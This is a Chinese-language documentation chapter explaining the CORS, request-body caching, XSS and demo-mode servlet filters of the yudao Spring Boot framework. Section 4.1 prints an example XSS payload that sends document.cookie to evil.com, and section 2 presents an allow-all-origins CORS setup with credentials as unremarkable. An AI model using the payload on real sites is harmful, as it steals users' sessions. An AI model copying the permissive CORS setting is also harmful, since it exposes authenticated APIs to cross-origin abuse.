# 过滤器与安全防护实现

> 本章是功能实现的第四章，对应功能设计中的 [过滤器链与安全防护设计](../功能设计/04-过滤器链与安全防护设计.md)。设计章节讲了"为什么需要 CORS、XSS、请求体缓存等过滤器"。本章讲"怎么实现"。

## 1. 过滤器总览

本项目中，Web Starter 注册了以下过滤器（按执行顺序）：

```
CORS_FILTER (Integer.MIN_VALUE)
  ↓
REQUEST_BODY_CACHE_FILTER (Integer.MIN_VALUE + 500)
  ↓
API_ENCRYPT_FILTER (Integer.MIN_VALUE + 501)    ← 条件装配
  ↓
TENANT_CONTEXT_FILTER (-104)                     ← 租户模块
  ↓
API_ACCESS_LOG_FILTER (-103)                     ← 本章
  ↓
XSS_FILTER (-102)                                ← 本章
  ↓
Spring Security (-100)
  ↓
DEMO_FILTER (Integer.MAX_VALUE)                  ← 条件装配
```

本章重点讲解 CORS、XSS、请求体缓存这三个在 Web Starter 中注册的过滤器。

## 2. CORS 跨域过滤器

### 2.1 为什么需要 CORS

浏览器的同源策略会阻止前端（如 `localhost:3000`）调用后端（如 `localhost:8080`）的接口。CORS（Cross-Origin Resource Sharing）是 W3C 标准，允许服务器声明哪些源可以访问。

### 2.2 实现代码

`yudao-framework/yudao-spring-boot-starter-web/src/main/java/cn/iocoder/yudao/framework/web/config/YudaoWebAutoConfiguration.java`（CORS 部分）:

```java
@Bean
@Order(value = WebFilterOrderEnum.CORS_FILTER)
public FilterRegistrationBean<CorsFilter> corsFilterBean() {
    // 创建 CorsConfiguration 对象
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowCredentials(true);
    config.addAllowedOriginPattern("*"); // 设置访问源地址
    config.addAllowedHeader("*");        // 设置访问源请求头
    config.addAllowedMethod("*");        // 设置访问源请求方法
    // 创建 UrlBasedCorsConfigurationSource 对象
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config); // 对接口配置跨域设置
    return createFilterBean(new CorsFilter(source), WebFilterOrderEnum.CORS_FILTER);
}
```

这里使用的是 Spring 框架自带的 `org.springframework.web.filter.CorsFilter`，而不是自定义的 Filter 类。

### 2.3 配置解读

| 配置项 | 值 | 含义 |
|--------|-----|------|
| `allowCredentials` | `true` | 允许携带 Cookie（如 Session、Token） |
| `addAllowedOriginPattern("*")` | `*` | 允许所有来源 |
| `addAllowedHeader("*")` | `*` | 允许所有请求头 |
| `addAllowedMethod("*")` | `*` | 允许所有 HTTP 方法 |

注意：`addAllowedOriginPattern("*")` 而不是 `addAllowedOrigin("*")`。这是因为当 `allowCredentials=true` 时，`addAllowedOrigin("*")` 会被浏览器拒绝（W3C 规范不允许）。`addAllowedOriginPattern("*")` 是 Spring 5.3 引入的替代方案，它会在响应头中返回实际的 Origin 值而不是 `*`。

### 2.4 顺序至关重要

CORS 过滤器的顺序是 `Integer.MIN_VALUE`——最高优先级。为什么？

浏览器发送跨域请求时，会先发一个 **预检请求**（OPTIONS 方法）。如果 CORS 过滤器不在最前面，预检请求可能被其他过滤器拦截（比如返回 401），导致前端拿不到跨域响应头。

```
浏览器发送 OPTIONS 预检请求
  │
  ▼
CORS_FILTER（最先执行）
  │
  ├─ 识别为 OPTIONS 请求
  ├─ 添加 Access-Control-Allow-Origin 等响应头
  ├─ 返回 200
  │
  ▼
浏览器检查 CORS 响应头 → 允许跨域 → 发送真正的请求
```

## 3. 请求体缓存过滤器

### 3.1 问题：InputStream 只能读一次

Servlet 的 `HttpServletRequest.getInputStream()` 返回的 `InputStream` 只能读取一次。读完之后，流就关闭了。这带来一个问题：如果多个过滤器都需要读取请求体（比如 XSS 过滤 + 访问日志 + API 加解密），第一个读完之后，后面的就读不到了。

### 3.2 解决方案：包装 Request

`yudao-framework/yudao-spring-boot-starter-web/src/main/java/cn/iocoder/yudao/framework/web/core/filter/CacheRequestBodyFilter.java`:

```java
package cn.iocoder.yudao.framework.web.core.filter;

import cn.hutool.core.util.StrUtil;
import cn.iocoder.yudao.framework.common.util.servlet.ServletUtils;
import org.springframework.web.filter.OncePerRequestFilter;

import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

/**
 * Request Body 缓存 Filter，实现它的可重复读取
 */
public class CacheRequestBodyFilter extends OncePerRequestFilter {

    /**
     * 需要排除的 URI
     *
     * 1. 排除 Spring Boot Admin 相关请求，避免客户端连接中断导致的异常。
     */
    private static final String[] IGNORE_URIS = {"/admin/", "/actuator/"};

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain filterChain)
            throws IOException, ServletException {
        filterChain.doFilter(new CacheRequestBodyWrapper(request), response);
    }

    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        // 1. 校验是否为排除的 URL
        String requestURI = request.getRequestURI();
        if (StrUtil.startWithAny(requestURI, IGNORE_URIS)) {
            return true;
        }
        // 2. 只处理 json 请求内容
        return !ServletUtils.isJsonRequest(request);
    }
}
```

### 3.3 工作原理

`CacheRequestBodyFilter` 继承自 `OncePerRequestFilter`（保证每个请求只执行一次），做了两件事：

1. **`shouldNotFilter`**：排除不需要缓存的请求（如 Spring Boot Admin 的 SSE 连接、非 JSON 请求）
2. **`doFilterInternal`**：用 `CacheRequestBodyWrapper` 包装原始 Request，替换到过滤器链中

`CacheRequestBodyWrapper` 的核心思路是：在第一次读取 `InputStream` 时，将内容缓存到字节数组中。后续读取时，从字节数组中重新构造 `InputStream`。

```
原始请求
  │
  ▼
CacheRequestBodyFilter
  │
  ├─ new CacheRequestBodyWrapper(request)  ← 包装
  │
  ▼
filterChain.doFilter(wrappedRequest, response)
  │
  ├─ 后续过滤器/Controller 读取 InputStream
  │    │
  │    ├─ 第一次读取 → 从原始流读取，同时缓存到 byte[]
  │    └─ 第二次读取 → 从 byte[] 重新构造 InputStream
  │
  ▼
Controller 处理
```

### 3.4 排除规则

为什么排除 `/admin/` 和 `/actuator/`？

- `/admin/`：Spring Boot Admin 的健康检查使用 SSE（Server-Sent Events），读取其请求体会导致连接中断
- `/actuator/`：Spring Boot Actuator 的端点，通常是健康检查、指标收集等，不需要缓存

## 4. XSS 过滤器

### 4.1 XSS 攻击原理

XSS（Cross-Site Scripting）攻击是指攻击者在用户输入中注入恶意脚本，当其他用户浏览时，脚本被执行。

例如，电商系统中，用户在商品名称中输入：
```
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

如果没有 XSS 过滤，这段脚本会在其他用户查看商品时执行，窃取用户的 Cookie。

### 4.2 XssFilter

`yudao-framework/yudao-spring-boot-starter-web/src/main/java/cn/iocoder/yudao/framework/xss/core/filter/XssFilter.java`:

```java
package cn.iocoder.yudao.framework.xss.core.filter;

import cn.iocoder.yudao.framework.xss.config.XssProperties;
import cn.iocoder.yudao.framework.xss.core.clean.XssCleaner;
import lombok.AllArgsConstructor;
import org.springframework.util.PathMatcher;
import org.springframework.web.filter.OncePerRequestFilter;

import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@AllArgsConstructor
public class XssFilter extends OncePerRequestFilter {

    private final XssProperties properties;
    private final PathMatcher pathMatcher;
    private final XssCleaner xssCleaner;

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain filterChain)
            throws IOException, ServletException {
        filterChain.doFilter(new XssRequestWrapper(request, xssCleaner), response);
    }

    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        // 如果关闭，则不过滤
        if (!properties.isEnable()) {
            return true;
        }
        // 如果匹配到无需过滤，则不过滤
        String uri = request.getRequestURI();
        return properties.getExcludeUrls().stream()
                .anyMatch(excludeUrl -> pathMatcher.match(excludeUrl, uri));
    }
}
```

XSS 过滤的思路和请求体缓存类似——通过包装 Request，在读取参数时自动清理。

### 4.3 XssRequestWrapper

`yudao-framework/yudao-spring-boot-starter-web/src/main/java/cn/iocoder/yudao/framework/xss/core/filter/XssRequestWrapper.java`:

```java
package cn.iocoder.yudao.framework.xss.core.filter;

import cn.iocoder.yudao.framework.xss.core.clean.XssCleaner;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import java.util.LinkedHashMap;
import java.util.Map;

public class XssRequestWrapper extends HttpServletRequestWrapper {

    private final XssCleaner xssCleaner;

    public XssRequestWrapper(HttpServletRequest request, XssCleaner xssCleaner) {
        super(request);
        this.xssCleaner = xssCleaner;
    }

    @Override
    public Map<String, String[]> getParameterMap() {
        Map<String, String[]> map = new LinkedHashMap<>();
        Map<String, String[]> parameters = super.getParameterMap();
        for (Map.Entry<String, String[]> entry : parameters.entrySet()) {
            String[] values = entry.getValue();
            for (int i = 0; i < values.length; i++) {
                values[i] = xssCleaner.clean(values[i]);
            }
            map.put(entry.getKey(), values);
        }
        return map;
    }

    @Override
    public String[] getParameterValues(String name) {
        String[] values = super.getParameterValues(name);
        if (values == null) {
            return null;
        }
        int count = values.length;
        String[] encodedValues = new String[count];
        for (int i = 0; i < count; i++) {
            encodedValues[i] = xssCleaner.clean(values[i]);
        }
        return encodedValues;
    }

    @Override
    public String getParameter(String name) {
        String value = super.getParameter(name);
        if (value == null) {
            return null;
        }
        return xssCleaner.clean(value);
    }

    @Override
    public Object getAttribute(String name) {
        Object value = super.getAttribute(name);
        if (value instanceof String) {
            return xssCleaner.clean((String) value);
        }
        return value;
    }

    @Override
    public String getHeader(String name) {
        String value = super.getHeader(name);
        if (value == null) {
            return null;
        }
        return xssCleaner.clean(value);
    }

    @Override
    public String getQueryString() {
        String value = super.getQueryString();
        if (value == null) {
            return null;
        }
        return xssCleaner.clean(value);
    }
}
```

`XssRequestWrapper` 覆写了所有可能读取用户输入的方法：
- `getParameter()` / `getParameterValues()` / `getParameterMap()` — 查询参数
- `getAttribute()` — Request 属性
- `getHeader()` — 请求头
- `getQueryString()` — 原始查询字符串

每个方法在返回值之前，都调用 `xssCleaner.clean()` 进行清理。

### 4.4 XSS 清理器

默认使用 Jsoup 实现清理（`JsoupXssCleaner`），它会解析 HTML 并移除不安全的标签和属性。这比正则表达式可靠得多——Jsoup 能正确处理各种畸形 HTML。

### 4.5 配置

`yudao-framework/yudao-spring-boot-starter-web/src/main/java/cn/iocoder/yudao/framework/xss/config/XssProperties.java`:

```java
@ConfigurationProperties(prefix = "yudao.xss")
@Validated
@Data
public class XssProperties {
    /**
     * 是否开启，默认为 true
     */
    private boolean enable = true;
    /**
     * 需要排除的 URL，默认为空
     */
    private List<String> excludeUrls = Collections.emptyList();
}
```

配置示例：
```yaml
yudao:
  xss:
    enable: true
    exclude-urls:
      - /admin-api/system/dict-data/import  # 导入接口可能包含特殊字符
```

### 4.6 Jackson 反序列化中的 XSS 过滤

除了 Query 参数，JSON 请求体中的字符串也需要做 XSS 过滤。项目通过自定义 Jackson 反序列化器来实现。

`yudao-framework/yudao-spring-boot-starter-web/src/main/java/cn/iocoder/yudao/framework/xss/config/YudaoXssAutoConfiguration.java`（相关部分）:

```java
@Bean
@ConditionalOnMissingBean(name = "xssJacksonCustomizer")
@ConditionalOnProperty(value = "yudao.xss.enable", havingValue = "true")
public Jackson2ObjectMapperBuilderCustomizer xssJacksonCustomizer(
        XssProperties properties, PathMatcher pathMatcher, XssCleaner xssCleaner) {
    return builder ->
            builder.deserializerByType(String.class,
                    new XssStringJsonDeserializer(properties, pathMatcher, xssCleaner));
}
```

这样，当 Jackson 反序列化 `@RequestBody` 中的字符串字段时，会自动经过 XSS 清理。

## 5. Demo 过滤器

`yudao-framework/yudao-spring-boot-starter-web/src/main/java/cn/iocoder/yudao/framework/web/core/filter/DemoFilter.java`:

```java
package cn.iocoder.yudao.framework.web.core.filter;

import cn.hutool.core.util.StrUtil;
import cn.iocoder.yudao.framework.common.pojo.CommonResult;
import cn.iocoder.yudao.framework.common.util.servlet.ServletUtils;
import org.springframework.web.filter.OncePerRequestFilter;

import javax.servlet.FilterChain;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import static cn.iocoder.yudao.framework.common.exception.enums.GlobalErrorCodeConstants.DEMO_DENY;

public class DemoFilter extends OncePerRequestFilter {

    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        String method = request.getMethod();
        return !StrUtil.equalsAnyIgnoreCase(method, "POST", "PUT", "DELETE")
                || WebFrameworkUtils.getLoginUserId(request) == null;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain chain) {
        ServletUtils.writeJSON(response, CommonResult.error(DEMO_DENY));
    }
}
```

这是一个演示模式的过滤器——当 `yudao.demo=true` 时，禁止所有写操作（POST/PUT/DELETE），但只对已登录用户生效。未登录用户的请求不会被拦截（因为登录接口本身是 POST）。

## 6. ApiRequestFilter 基类

多个过滤器（`ApiAccessLogFilter`、`ApiEncryptFilter`）有相同的逻辑：只处理 `/admin-api` 和 `/app-api` 开头的请求。项目提取了一个基类。

`yudao-framework/yudao-spring-boot-starter-web/src/main/java/cn/iocoder/yudao/framework/web/core/filter/ApiRequestFilter.java`:

```java
package cn.iocoder.yudao.framework.web.core.filter;

import cn.hutool.core.util.StrUtil;
import cn.iocoder.yudao.framework.web.config.WebProperties;
import lombok.RequiredArgsConstructor;
import org.springframework.web.filter.OncePerRequestFilter;

import javax.servlet.http.HttpServletRequest;

@RequiredArgsConstructor
public abstract class ApiRequestFilter extends OncePerRequestFilter {

    protected final WebProperties webProperties;

    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        String apiUri = request.getRequestURI()
                .substring(request.getContextPath().length());
        return !StrUtil.startWithAny(apiUri,
                webProperties.getAdminApi().getPrefix(),
                webProperties.getAppApi().getPrefix());
    }
}
```

子类只需要实现 `doFilterInternal`，不需要重复写"判断是否为 API 请求"的逻辑。

## 7. 工具类：ServletUtils

`ServletUtils` 是项目中广泛使用的工具类，提供了 HTTP 请求/响应的便捷方法。它位于 `yudao-common` 模块中（注意：不是 Web Starter 中的 `WebFrameworkUtils`）。

常用方法：

| 方法 | 作用 |
|------|------|
| `getParamMap(request)` | 获取所有查询参数为 Map |
| `getBody(request)` | 获取请求体字符串（可重复读取） |
| `getUserAgent(request)` | 获取 User-Agent |
| `getClientIP(request)` | 获取客户端真实 IP（支持代理） |
| `isJsonRequest(request)` | 判断是否为 JSON 请求 |
| `writeJSON(response, result)` | 将对象写入响应（JSON 格式） |

## 8. 过滤器执行流程图

```
HTTP 请求到达
  │
  ▼
┌─────────────────────────────────────────────────┐
│ CorsFilter (order = Integer.MIN_VALUE)          │
│  ├─ OPTIONS 预检请求 → 直接返回跨域响应头        │
│  └─ 普通请求 → 添加跨域响应头，继续              │
└─────────────────────────────────────────────────┘
  │
  ▼
┌─────────────────────────────────────────────────┐
│ CacheRequestBodyFilter (order = MIN + 500)      │
│  ├─ 非 JSON 请求 → 跳过                          │
│  └─ JSON 请求 → 包装为 CacheRequestBodyWrapper  │
└─────────────────────────────────────────────────┘
  │
  ▼
┌─────────────────────────────────────────────────┐
│ ApiEncryptFilter (order = MIN + 501)            │ ← 条件装配
│  ├─ 无加密标记 → 跳过                            │
│  └─ 有加密标记 → 解密请求体                       │
└─────────────────────────────────────────────────┘
  │
  ▼
┌─────────────────────────────────────────────────┐
│ ApiAccessLogFilter (order = -103)               │
│  ├─ 记录开始时间                                  │
│  ├─ 提前读取请求参数（避免被后续 Filter 修改）      │
│  └─ 继续过滤器链                                  │
└─────────────────────────────────────────────────┘
  │
  ▼
┌─────────────────────────────────────────────────┐
│ XssFilter (order = -102)                        │
│  ├─ 关闭或排除 URL → 跳过                         │
│  └─ 包装为 XssRequestWrapper（自动清理参数）       │
└─────────────────────────────────────────────────┘
  │
  ▼
┌─────────────────────────────────────────────────┐
│ Spring Security Filter (order = -100)           │
│  ├─ 认证：解析 Token，设置用户信息                 │
│  └─ 鉴权：检查 @PreAuthorize 权限                │
└─────────────────────────────────────────────────┘
  │
  ▼
┌─────────────────────────────────────────────────┐
│ DemoFilter (order = Integer.MAX_VALUE)          │ ← 条件装配
│  ├─ GET 请求 → 跳过                              │
│  └─ POST/PUT/DELETE → 返回 DEMO_DENY            │
└─────────────────────────────────────────────────┘
  │
  ▼
DispatcherServlet → Controller
  │
  ▼
GlobalExceptionHandler（如果抛出异常）
  或
GlobalResponseBodyHandler（记录返回值）
```

## 9. 小结

本章实现了三个核心过滤器和相关安全防护：

1. **CORS 过滤器**：使用 Spring 的 `CorsFilter`，允许所有来源的跨域请求，顺序为最高优先级
2. **请求体缓存过滤器**：通过 `CacheRequestBodyWrapper` 包装 Request，解决 `InputStream` 只能读一次的问题
3. **XSS 过滤器**：通过 `XssRequestWrapper` 包装 Request，在参数读取时自动清理恶意脚本；Jackson 反序列化层也做了 XSS 处理
4. **ApiRequestFilter 基类**：提取"只处理 API 请求"的通用逻辑
5. **DemoFilter**：演示模式下禁止写操作
